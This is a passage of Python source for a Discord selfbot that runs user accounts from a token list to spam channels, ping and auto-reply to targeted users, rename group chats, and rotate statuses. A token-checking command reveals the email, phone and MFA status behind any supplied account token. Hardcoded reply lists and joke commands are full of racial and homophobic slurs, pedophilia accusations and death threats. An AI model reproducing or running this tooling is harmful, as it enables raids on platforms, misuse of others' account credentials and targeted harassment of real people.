    gif_url = await fetch_anime_gif("yeet")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} yeets {member.display_name}! 💨```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime yeet GIF right now, try again later!```")

#Start playing
@bot.command(alises=["game"])
@require_password()
async def playing(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}playing <message>')
        return
    game = discord.Game(name=message)
    await bot.change_presence(activity=game)

#Start listening
@bot.command(aliases=["listen"])
@require_password()
async def listening(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}listening <message>')
        return
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))

#Start wathcing
@bot.command(aliases=["watch"])
@require_password()
async def watching(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {get_prefix}watching <message>')
        return
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))

#Stop your current activity
@bot.command(aliases=["stopstreaming", "stoplistening", "stopplaying", "stopwatching"])
@require_password()
async def stopactivity(ctx):
    await ctx.message.delete()
    await bot.change_presence(activity=None, status=discord.Status.dnd)
    
    
# Global variables with '300' added
streaming_status_delay300 = {}  # Delay per token position
active_clients300 = {}  # Active clients per token position
streaming_status_lists300 = {}  # Status lists per token position

class MultiStreamClient300(discord.Client):
    def __init__(self, token, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token300 = token
        self.position300 = position
        self.running = True  # Control loop for rotation

    async def update_presence300(self, details):
        """Update the custom streaming presence."""
        activity = discord.Streaming(
            name=details,
            url='https://www.twitch.tv/yourchannel'  # Replace with your channel URL
        )
        await self.change_presence(activity=activity)

    async def rotate_statuses300(self):
        """Rotate through the streaming statuses for this token indefinitely."""
        global streaming_status_delay300, streaming_status_lists300
        while self.running:
            statuses = streaming_status_lists300.get(self.position300, [])
            delay = streaming_status_delay300.get(self.position300, 3)
            for status in statuses:
                if not self.running:
                    break
                await self.update_presence300(status)
                await asyncio.sleep(delay)

    async def on_ready(self):
        print(f'Logged in as {self.user} with token {self.token300[-4:]}')
        asyncio.create_task(self.rotate_statuses300())

    async def stop_rotation(self):
        """Stop the status rotation loop."""
        self.running = False
        await self.close()

async def start_client_with_rotation300(token, position, statuses):
    """Log in the specified token and start rotating statuses for it."""
    global streaming_status_lists300, active_clients300
    streaming_status_lists300[position] = statuses  # Set status list for this token

    client = MultiStreamClient300(token, position, intents=intents)
    active_clients300[position] = client
    await client.start(token, bot=False)  # Start client

@bot.command()
@require_password()
async def ss(ctx, position: int, *, statuses: str):
    """Set and start rotating the stream status for a specific token."""
    global active_clients300, streaming_status_lists300

    # Load tokens from a file
    tokens = read_tokens('tokens2.txt')

    # Check if position is valid (1-based index)
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Parse and set the statuses
    statuses_list = [status.strip() for status in statuses.split(',')]
    token = tokens[position - 1]  # Adjust for 1-based index

    # Stop any existing client for this token if already running
    if position in active_clients300:
        await active_clients300[position].stop_rotation()
        del active_clients300[position]

    # Start new client with the specified statuses
    await start_client_with_rotation300(token, position, statuses_list)
    await ctx.send(f"Started rotating streaming statuses for token {position}.")

@bot.command()
@require_password()
async def sse(ctx, position: int):
    """Stop rotating streaming statuses for a specific token."""
    global active_clients300

    # Check if client for this token position is active (1-based index)
    if position in active_clients300:
        await active_clients300[position].stop_rotation()
        del active_clients300[position]
        await ctx.send(f"Stopped rotating streaming statuses for token {position}.")
    else:
        await ctx.send(f"No active status rotation found for token {position}.")

@bot.command()
@require_password()
async def ssd(ctx, position: int, delay: int):
    """Change the delay between streaming status updates for a specific token."""
    global streaming_status_delay300

    if delay > 0:
        streaming_status_delay300[position] = delay  # Set delay for this token (1-based index)
        await ctx.send(f"Streaming status delay for token {position} changed to {delay} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")

@bot.command()
@require_password()
async def ssa(ctx, *, statuses: str):
    """Start rotating streaming statuses for all tokens."""
    global active_clients300

    # Load tokens from a file
    tokens = read_tokens('tokens2.txt')
    statuses_list = [status.strip() for status in statuses.split(',')]

    # Stop any existing clients
    for position, client in active_clients300.items():
        await client.stop_rotation()
    active_clients300.clear()

    # Start new clients with specified statuses
    for i, token in enumerate(tokens, start=1):  # 1-based index
        await start_client_with_rotation300(token, i, statuses_list)

    await ctx.send("Started rotating streaming statuses for all tokens.")

@bot.command()
@require_password()
async def ssae(ctx):
    """Stop rotating streaming statuses for all tokens."""
    global active_clients300

    # Stop all active clients
    for client in active_clients300.values():
        await client.stop_rotation()
    active_clients300.clear()

    await ctx.send("Stopped rotating streaming statuses for all tokens.")

@bot.command()
@require_password()
async def ssda(ctx, delay: int):
    """Change the delay between streaming status updates for all tokens."""
    global streaming_status_delay300

    if delay > 0:
        # Set delay for all token positions
        for position in active_clients300.keys():
            streaming_status_delay300[position] = delay
        await ctx.send(f"Streaming status delay for all tokens changed to {delay} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")





        
        
@bot.command(name='rstatus')
@require_password()
async def rotate_status(ctx, *, statuses: str):
    global status_rotation_active, current_status, current_emoji
    await ctx.message.delete()
    
    status_list = [s.strip() for s in statuses.split(',')]
    
    if not status_list:
        await ctx.send("```Please separate statuses by commas.```", delete_after=3)
        return
    
    current_index = 0
    status_rotation_active = True
    
    async def update_status_emoji():
        json_data = {
            'custom_status': {
                'text': current_status,
                'emoji_name': current_emoji
            }
        }

        custom_emoji_match = re.match(r'<a?:(\w+):(\d+)>', current_emoji)
        if custom_emoji_match:
            name, emoji_id = custom_emoji_match.groups()
            json_data['custom_status']['emoji_name'] = name
            json_data['custom_status']['emoji_id'] = emoji_id
        else:
            json_data['custom_status']['emoji_name'] = current_emoji

        async with aiohttp.ClientSession() as session:
            try:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={'Authorization': bot.http.token, 'Content-Type': 'application/json'},
                    json=json_data
                ) as resp:
                    await resp.read()
            finally:
                await session.close()

    await ctx.send(f"```Status rotation started```")
    
    try:
        while status_rotation_active:
            current_status = status_list[current_index]
            await update_status_emoji()
            await asyncio.sleep(8)
            current_index = (current_index + 1) % len(status_list)
                
    finally:
        current_status = ""
        await update_status_emoji()
        status_rotation_active = False

@bot.command(name='remoji')
@require_password()
async def rotate_emoji(ctx, *, emojis: str):
    global emoji_rotation_active, current_emoji, status_rotation_active
    await ctx.message.delete()
    
    emoji_list = [e.strip() for e in emojis.split(',')]
    
    if not emoji_list:
        await ctx.send("```Please separate emojis by commas.```", delete_after=3)
        return
    
    current_index = 0
    emoji_rotation_active = True
    
    async def update_status_emoji():
        json_data = {
            'custom_status': {
                'text': current_status,
                'emoji_name': current_emoji
            }
        }
        
        custom_emoji_match = re.match(r'<a?:(\w+):(\d+)>', current_emoji)
        if custom_emoji_match:
            name, emoji_id = custom_emoji_match.groups()
            json_data['custom_status']['emoji_name'] = name
            json_data['custom_status']['emoji_id'] = emoji_id
        else:
            json_data['custom_status']['emoji_name'] = current_emoji

        async with aiohttp.ClientSession() as session:
            try:
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={'Authorization': bot.http.token, 'Content-Type': 'application/json'},
                    json=json_data
                ) as resp:
                    await resp.read()
            finally:
                await session.close()

    await ctx.send(f"```Emoji rotation started```")
    
    try:
        while emoji_rotation_active:
            current_emoji = emoji_list[current_index]
            await update_status_emoji()
            await asyncio.sleep(8)
            current_index = (current_index + 1) % len(emoji_list)
                
    finally:
        current_emoji = ""
        await update_status_emoji()
        emoji_rotation_active = False

@bot.command(name='stopstatus')
@require_password()
async def stop_rotate_status(ctx):
    global status_rotation_active
    status_rotation_active = False
    await ctx.send("```Status rotation stopped.```", delete_after=3)

@bot.command(name='stopemoji')
@require_password()
async def stop_rotate_emoji(ctx):
    global emoji_rotation_active
    emoji_rotation_active = False
    await ctx.send("```Emoji rotation stopped.```", delete_after=3)
    
@bot.command(help="Check if a Discord user token is valid or get detailed info.\nUsage: ct <v|i> <token>")
@require_password()
async def ct(ctx, mode: str, token: str):
    await ctx.message.delete()
    
    headers = {
        'Authorization': token
    }

    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)

    if response.status_code == 200:
        if mode.lower() == "v":
            info = "**Token is valid.**"
        elif mode.lower() == "i":
            user_data = response.json()
            
            # Process user_data and format info
            info = (
                f"**Token is valid.**\n\n"
                f"**Username**: {user_data.get('username', 'N/A')}#{user_data.get('discriminator', 'N/A')}\n"
                f"**User ID**: {user_data.get('id', 'N/A')}\n"
                f"**Email**: {user_data.get('email', 'N/A')}\n"
                f"**Phone No.**: {user_data.get('phone', 'N/A')}\n"
                f"**Nitro**: {'Yes' if user_data.get('premium_type') else 'No'}\n"
                f"**Email Verified**: {'Yes' if user_data.get('verified') else 'No'}\n"
                f"**Phone Verified**: {'Yes' if user_data.get('phone') else 'No'}\n"
                f"**MFA**: {'Yes' if user_data.get('mfa_enabled') else 'No'}\n"
                f"**NSFW**: {'Yes' if user_data.get('nsfw_allowed') else 'No'}\n"
                f"**Creation**: {discord.utils.snowflake_time(int(user_data.get('id', 'N/A'))).strftime('%d %B %Y; %I:%M:%S %p')}\n"
                f"**Banner URL**: {user_data.get('banner', 'N/A')}\n"
                f"**Accent Color**: {user_data.get('accent_color', 'N/A')}\n"
                f"**Avatar URL**: https://cdn.discordapp.com/avatars/{user_data.get('id', 'N/A')}/{user_data.get('avatar', 'N/A')}.png\n"
            )
        else:
            info = "**Invalid mode. Please use 'validation' or 'info'.**"
    elif response.status_code == 401:
        info = "**Token is invalid.**"
    else:
        info = f"**An unexpected error occurred: {response.status_code}**"

    await ctx.send(info, delete_after=30)

@bot.command()
@require_password()
async def setstatus(ctx, status_type: str):
    await ctx.message.delete()
    status_type = status_type.lower()
    if status_type == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.send('Online.', delete_after=3)
    elif status_type == 'dnd':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.send('dnd', delete_after=3)        
    elif status_type == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.send('idle.', delete_after=3)
    elif status_type == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.send('invisible.', delete_after=3)
    else:
        await ctx.send('Invalid status type. Use `online` or `dnd` or `invisible` or `idle`.', delete_after=5)

@setstatus.error
async def status_error(ctx, error):
    await ctx.send(f'An error occurred: {error}', delete_after=3)
    
# Global variables
user_to_ping = {}
current_delay = {}
current_mode = {}
active_clients = {}


@bot.command()
@require_password()
async def diddy(ctx, user: discord.User):
    percentage = random.randint(10,1000)
    await ctx.send(f"{user.mention} is {percentage}% diddy\n stop oiling up kids diddy ahh ☠️")
    
    
@bot.command
@require_password()
async def smellychatpacker(ctx, user: discord.User):
    percentage =  random.randint(1, 200)
    await ctx.send (f"{user.mention}is {percentage}% smelly as fuck chatpacker\n go take a shower u fuckin loser")

@bot.command()
@require_password()
async def pedophile(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% pedophile fucking pedo\n fucking pedophile stop touching kids nigga is chiefjustice LOLO ☠️")


@bot.command()
@require_password()
async def GOAT(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% GOAT, nigga not a goat\n ur not on my level weak fuck ☠️")


@bot.command()
@require_password()
async def ceepeelover(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% ceepee, nigga ew a pedophile\n nigga idols are chiefjustice and mourn lolololo ☠️")


@bot.command()
@require_password()
async def nitro(ctx, user: discord.User):
    await ctx.send(f"{user.mention} https://media.discordapp.net/attachments/1153645269745926174/1194096579011956767/ezgif-1-c9599ca267.gif?ex=674bc199&is=674a7019&hm=9a1af4657b58be730316c368c9c2a206f8695f3d05a0c0e892a96399dccf42b4&=&width=292&height=198\n yes ur not getting nitro fuck ass nigga")    


@bot.command()
@require_password()
async def godly(ctx, user: discord.User):
    percentage = random.randint(1,150)
    await ctx.send(f"{user.mention} is {percentage}% godly\n nigga is not godly LOLOLO nigga is a fuckin lowtier")
    







def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

running_processes = {}

@bot.command()
@require_password()
async def gct(ctx, channel_id: int, position: int, name: str):
    # Start the gct.py script with the specified position and name
    process = subprocess.Popen(['python', 'gct.py', str(channel_id), str(position), name])

    # Store the process with the position as the key
    running_processes[position] = process

    await ctx.send(f'Started the channel renaming bot in channel ID {channel_id} for token position {position} with name: {name}')

@bot.command()
@require_password()
async def gcte(ctx, position: int):
    # Stop the renaming bot for the specific token at the given position
    if position in running_processes:
        process = running_processes[position]
        process.terminate()  # Terminate the process
        del running_processes[position]  # Remove the process from the dictionary
        await ctx.send(f'Stopped the channel renaming bot for token position {position}.')
    else:
        await ctx.send(f'No renaming bot is running for token position {position}.')

@bot.command()
@require_password()
async def gcta(ctx, channel_id: int, name: str):
    # Start the renaming process for all tokens
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Start a process for each token
    for position in range(1, len(tokens) + 1):
        process = subprocess.Popen(['python', 'gct.py', str(channel_id), str(position), name])
        running_processes[position] = process

    await ctx.send(f'Started the channel renaming bot for all tokens in channel ID {channel_id} with name: {name}')

@bot.command()
@require_password()
async def gctae(ctx):
    # Stop all renaming bots for all tokens
    if running_processes:
        for position, process in list(running_processes.items()):
            process.terminate()  # Terminate each process
            del running_processes[position]
        await ctx.send('Stopped all channel renaming bots for all tokens.')
    else:
        await ctx.send('No renaming bots are currently running.')



def load_jokes():
    with open("jokes.txt", "r") as f:
        return f.read().splitlines()

class MultiTokenClient(discord.Client):
    def __init__(self, token, delay, channel_id, user_to_ping=None, mode=1, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.delay = delay
        self.channel_id = channel_id
        self.user_to_ping = user_to_ping
        self.running = True
        self.mode = mode  # Store the mode

    async def on_ready(self):
        print(f'Logged in as {self.user}')
        channel = self.get_channel(self.channel_id)

        while self.running:
            joke = random.choice(load_jokes())  # Load a random joke
            message = self.format_message(joke)
            if message and channel:  # Ensure the channel is valid and message is not None
                try:
                    await channel.send(message)  # Send the joke
                except discord.Forbidden:
                    print(f"Message blocked: {message}")  # Log that the message was blocked
                except Exception as e:
                    print(f"An error occurred: {e}")  # Handle other potential errors
            await asyncio.sleep(self.delay)

    def format_message(self, joke):
        # Apply the selected mode to format the joke
        if self.mode == 1:
            return f" {joke} <@{self.user_to_ping}>" if self.user_to_ping else joke  # Normal
        elif self.mode == 2:
            return f" {' '.join(joke.split())} <@{self.user_to_ping}>" if self.user_to_ping else '\n'.join(joke.split())  # 1 new line between words
        elif self.mode == 3:
            return f"{'# ' + (joke * 20)} <@{self.user_to_ping}>" if self.user_to_ping else f"{'# ' + (joke * 20)}"  # Single joke as header multiplied by 20
        elif self.mode == 4:
            normal = joke
            new_lines = '\n'.join([f"{word}" for word in joke.split()])
            header = f"{'# ' + joke} <@{self.user_to_ping}>"
            return f"{normal}\n{new_lines}\n{header}"
        elif self.mode == 5:
            return f"<@{self.user_to_ping}> {'\n'.join([f'{word}' for word in joke.split()])}\n" * 100 if self.user_to_ping else '\n'.join([f'{word}' for word in joke.split()]) + "\n" * 100  # 100 new lines between words
        elif self.mode == 6:
            return f" {'# ' + joke} <@{self.user_to_ping}>" if self.user_to_ping else f"{'# ' + joke}"  # Header without multiplying
        elif self.mode == 7:
            self.delay = random.uniform(2, 4)  # Random delay between 2 and 4 seconds
            return f"<@{self.user_to_ping}> {joke}" if self.user_to_ping else joke  # Normal message format
        elif self.mode == 8:
            return None  # Do not return a message in mode 8
        elif self.mode == 9:
            return f"<@{self.user_to_ping}> {joke}\ndiscord.gg/corpses" if self.user_to_ping else f"{joke}\ndiscord.gg/corpsesodd"  # Appends full invite link
        elif self.mode == 10:
            return f"<@{self.user_to_ping}> {joke} /corpses" if self.user_to_ping else f"{joke} /corpses"  # Appends just the custom string (e.g., /odd)
        return joke  # Fallback to normal


@bot.command()
@require_password()
async def ap(ctx, channel_id: int, position: int, delay: float = 4):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].running = False
        await active_clients[token].close()

    client = MultiTokenClient(token, delay, channel_id)
    active_clients[token] = client  # Keep track of the active client
    await client.start(token, bot=False)  # Start the client
    await ctx.send(f'Started sending jokes in <#{channel_id}> every {delay} seconds using token at position {position}.')

@bot.command()
@require_password()
async def ape(ctx, position: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].running = False
        await active_clients[token].close()

    await ctx.send(f'Stopped sending jokes for token at position {position}.')

@bot.command()
@require_password()
async def app(ctx, position: int, user_id: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].user_to_ping = user_id  # Set the user to ping for this token
        await ctx.send(f'Token at position {position} will now ping <@{user_id}> with each joke.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
@require_password()
async def apm(ctx, position: int, mode: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].mode = mode  # Update the mode for the active token
        await ctx.send(f'Token at position {position} mode changed to {mode}.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
@require_password()
async def apa(ctx, channel_id: int):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    async def start_client(token):
        client = MultiTokenClient(token, 4, channel_id)  # Default delay set to 4 seconds
        active_clients[token] = client  # Keep track of the active client
        await client.start(token, bot=False)  # Start the client

    tasks = [start_client(token) for token in tokens]
    await asyncio.gather(*tasks)  # Start all tokens simultaneously

    await ctx.send(f'All tokens are now sending jokes in <#{channel_id}> every 4 seconds.')

@bot.command()
@require_password()
async def apae(ctx):
    global active_clients

    for token, client in active_clients.items():
        client.running = False  # Stop each client
        await client.close()  # Close the client connection

    active_clients.clear()  # Clear the active clients
    await ctx.send('Stopped all active tokens from sending jokes.')

@bot.command()
@require_password()
async def apd(ctx, position: int, delay: float):
    global active_clients

    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    token = tokens[position - 1]  # Adjust for zero-based index

    if token in active_clients:
        active_clients[token].delay = delay  # Update the delay for the active token
        await ctx.send(f'Token at position {position} delay changed to {delay} seconds.')
    else:
        await ctx.send("Token is not currently active.")

@bot.command()
@require_password()
async def apma(ctx, mode: int):
    global active_clients

    for token, client in active_clients.items():
        client.mode = mode  # Update the mode for all active tokens


@bot.command()
@require_password()
async def appa(ctx, user_id: int):
    global active_clients

    for token, client in active_clients.items():
        client.user_to_ping = user_id  # Set the user to ping for all active tokens

@bot.command()
@require_password()
async def apda(ctx, delay: float):
    global active_clients

    for token, client in active_clients.items():
        client.delay = delay  # Update the delay for each active token



@bot.command()
@require_password()

async def tc(ctx):
    valid_tokens = 0
    valid_usernames = set()  # Use a set to avoid duplicates

    # Read tokens from the tokens2.txt file
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    valid_tokens_list = []  # List to keep track of valid tokens

    for token in tokens:
        try:
            # Make a request to get the user info
            headers = {
                "Authorization": token
            }
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if response.status_code == 200:  # Valid token
                valid_tokens += 1
                user_info = response.json()
                username = f"{user_info['username']}#{user_info['discriminator']}"
                valid_usernames.add(username)  # Add username to set
                valid_tokens_list.append(token)  # Keep the valid token

            else:  # Invalid token
                # If invalid, do not keep the token
                print(f"Deleting invalid token: {token}")

        except Exception as e:
            print(f"An error occurred: {e}")

    # Write back the valid tokens to the file, removing invalid tokens
    with open("tokens2.txt", "w") as f:
        f.write("\n".join(valid_tokens_list))

    # Construct the result message for valid tokens
    result_message_content = (f"` Valid tokens: {valid_tokens}`\n"
                              f"` Usernames found: {len(valid_usernames)}`")

    # Send the results message
    result_message = await ctx.send(result_message_content)

    # Delete the command message after 0.1 seconds
    await asyncio.sleep(0.1)
    await ctx.message.delete()  # Deletes the command message, not the result message
    
    

@bot.command()
@require_password()
async def tokuser(ctx):
    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    valid_usernames = []

    for token in tokens:
        try:
            # Make a request to get the user info
            headers = {
                "Authorization": token
            }
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if response.status_code == 200:  # Valid token
                user_info = response.json()
                username = f"{user_info['username']}#{user_info['discriminator']}"
                valid_usernames.append(username)  # Append username in the order of tokens

        except Exception as e:
            print(f"An error occurred while fetching user info: {e}")

    # Construct the result message in chronological order
    usernames_display = "\n".join(f"{i + 1}. {username}" for i, username in enumerate(valid_usernames)) if valid_usernames else "No valid usernames found."
    result_message_content = (f"`Usernames:\n{usernames_display}`")

    # Send the results message
    await ctx.send(result_message_content)


@bot.command()
@require_password()
async def ar1(ctx, user_mention: str, *, text: str):

    custom_reply_list = [phrase.strip() for phrase in text.split(',')]

    ar1_targets[user_mention] = custom_reply_list

    confirmation = await ctx.send(f"Auto-reply enabled for {user_mention} with custom words: {', '.join(custom_reply_list)}")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()



@bot.command()
@require_password()

async def ar2(ctx, user_mention: str, *, text: str):

    custom_reply_list = [phrase.strip() for phrase in text.split(',')]

    spaced_list = []

    for phrase in custom_reply_list:

        words = phrase.split()

        spaced_list.append('\n'.join([word + '\n' * 100 for word in words]))

    ar2_targets[user_mention] = spaced_list

    confirmation = await ctx.send(f"Auto-reply enabled for {user_mention} with spaced words.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete() 
    
    
@bot.command()
@require_password()

async def ar1e(ctx):

    ar1_targets.clear()

    confirmation = await ctx.send("Custom auto-reply has been disabled for all users.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()



@bot.command()
@require_password()

async def ar2e(ctx):

    ar2_targets.clear()

    confirmation = await ctx.send("Spaced auto-reply has been disabled for all users.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()  
    
autoreplies = [
"Elbow Sniffer", "I Heard U Like Kids", "com reject LOL", "Dont U Sniff Dogshit", 
    "wsp biden kisser faggot", "Yo Slut Focus In Chat", "Toilet Cleaner?", "# Shit Sniffer?", 
    "# Don't Fold", "Cum Slut", "Grass Licker", "id piss on ur grave loser broke fuck lol 🤡",
    "sup feces sniffer how u been", "Hey I Heard You Like Kids", "Femboy", "Dont U Sniff Toilet Paper", 
    "Dont U Sniff Piss", "Booger Eater", "Half-Eaten Cow Lover", "Ur Mom Abuses You LOL", 
    "Autistic Bakugan", "Stop Fucking Your Mom", "Retarded Termite", "wsp slobber face munchie", 
    "wsp pedo molestor", "# I heard you eat bedbugs LOL", "Window Licker", "Rodent Licker", 
    "Yo Chat Look At This Roach Eater", "# Nice Fold", "# Don't Fold To vozwalks", 
    "FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK", 
    "DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD", "Wsp Pedo", 
    "Get Out Of Chat Nasty Ass Hoe", "You smell like beaver piss and 5 gay lesbian honey badgers", 
    "You got a gfuel tattoo under your armpit", "Thats why FlightReacts posted a hate comment on your dad's facebook", 
    "You got suplex slammed by Carmen Cortzen from the Spy Kids", 
    "Yo mom went toe to toe wit the hash slingin slasher", 
    "Yo grandmother taught the whole Glee class how to wrestle", 
    "UNSKILLED FARM WORKER", "Nigga you bout dislocated as fuck yo spine shaped like a special needs kangaroo doing the worm dumbass nigga you was in the african rainforest getting gangbanged by 7 bellydancing flamingos", 
    "You look like Patrick with corn rolls weak ass nigga you dirty as shit you watch fury from a roku tv from the smash bros game and you built like a booty bouncing papa Johns worker named tony with lipstick Siberian tiger stripes ass nigga you built like the great cacusian overchakra", 
    "You look like young ma with a boosie fade ugly ass nigga you dirty as shit and you built like a gay French kissing cock roach named jimmy with lipstick on dumb ass nigga you wash cars with duct tape and gorilla glue while a babysitter eats yo ass while listening to the ultra instinct theme song earape nigga you dirty as shit you got a iPhone 6 thats the shape of a laptop futuristic ass nigga you was binge watching Brandon rashad anime videos with a knife on yo lap dumb ass nigga you got triple butchins and you dance like a midget when yo mom tells you yo sister didn’t eat all the cheese cake cheese cake loving ass nigga", 
    "Stop \n Hiding \n From \n Me", "I \n Will \n Rip \n U \n In \n Half \n Cut \n Generator", 
    "stfu fat bum", "bring \n me \n ur \n neck \n ill \n kill \n you \n faggot \n ass \n slut \n ur \n weak \n as \n fuck \n nigga \n shut \n up \n vermin \n ass \n eslut \n with \n aids \n stupid \n cunt \n fucking \n trashbag \n niggas \n do \n not \n fw \n you \n at \n all \n weak \n lesbian \n zoophile", 
    "i \n will \n fucking \n end \n ur \n entire \n damn \n life \n failed \n com \n kid", 
    "I \n FUCKIN \n OWN \n YOU \n I \n WILL \n RIP \n YOUR \n GUTS \n OUT \n AND \n RIP \n YOUR \n HEAD \n OFF", 
    "Shut \n the \n fuck \n up \n bitch \n ass \n nigga \n you \n fucking  \n suck \n trashbag \n vermin \n ass \n bitch \n nigga", 
    "# STOP FOLDING \n SHIT \n EATER \n WHAT HAPPENED RATE LIMIT? \n HAHHAH \n UR \n ASS \n BITCH", 
    "U use skidded tools stfu LOL", "YOUR \n ASS \n KID \n STFU \n /PASSED \n VICTIM I \n RUN \n YOU \n DOGSHIT \n ASS \n BITCH \n YOU \n SUCK \n ASS \n NGL", 
    "Golf Ball Nose", "Grease Stain", "ur unwanted", "frail bitch \n Stop Shaking \n diabetic \n salt licker", 
    "shut the fuck up salt shaker", "# WHY \n ARE \n YOU \n IN MY CHAT \n GET THE FUCK OUT OF HERE U PEDO \n UR A CLOWN \n I MOG U BITCH STAYYYYY MAD LMAOAOAOOAOAOOO \n I RUN UR BLOODLINE \n U CUT UR WRISTS FOR A BABOON STOP TALKIN \n FRAIL WEAK FUCKIN BITCH \n DIE HOE UR UNWANTED \n GET OVER THE FACT IM BETTER THAN U RN PATHETIC ASS SLUTTY PROSTITUTE \n UR MOM AND U AND UR SISTER LIVE OFF BINGO $ FROM UR GRANDMOTHER \n KEEP TRYING TO FIGHT ME \n FRAIL WEAK FUCK \n STOP SHAKIN SO BAD \n DIABETIC SALT SNIFFER", 
    "snapping turtle neck ass nigga", "this nigga got a Passport attached to his feet", "you picked your nose and found a Flute", 
    "FAGGOT ASS PEDO", "Dusty Termite", "STOP \n \n \n \n \n \n GETTING \n \n \n \n \n \n PUNCHED ON \n \n \n \n \n \n \n BY ME AND DEATH AND SOULZ \n \n \n \n \n \n \n UR FUCKIN ASS BITCH MADE ASS NIGGA I WILL END UR DAMN LIFE"
    "/TAKING BITCHED U LOLOLOL HAIL RUNS U PEDO WAEK FUCK DORK FUCK SLUT",    "nb cares faggot", "YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck dogshit ass nigga",
"SHUT\nUP\nFAGGOT\nASS\nNIGGA\nYOU\nARE\nNOT\nON\nMY\nLEVEL\nILL\nFUCKING\nKILL\nYOU\nDIRTY\nASS\nPIG\nBASTARD\nBARREL\nNOSTRIL\nFAGGOT\nI\nOWN\nYOU\nKID\nSTFU\nLAME\nASS\nNIGGA\nU\nFUCKING\nSUCK\nI\nOWN\nBOW\nDOWN\nTO\nME\nPEASENT\nFAT\nASS\nNIGGA",
"ILL\nTAKE\nUR\nFUCKING\nSKULL\nAND\nSMASH\nIT\nU\nDIRTY\nPEDOPHILE\nGET\nUR\nHANDS\nOFF\nTHOSE\nLITTLE\nKIDS\nNASTY\nASS\nNIGGA\nILL\nFUCKNG\nKILL\nYOU\nWEIRD\nASS\nSHITTER\nDIRTFACE\nUR\nNOT\nON\nMY\nLEVEL\nCRAZY\nASS\nNIGGA\nSHUT\nTHE\nFUCK\nUP",
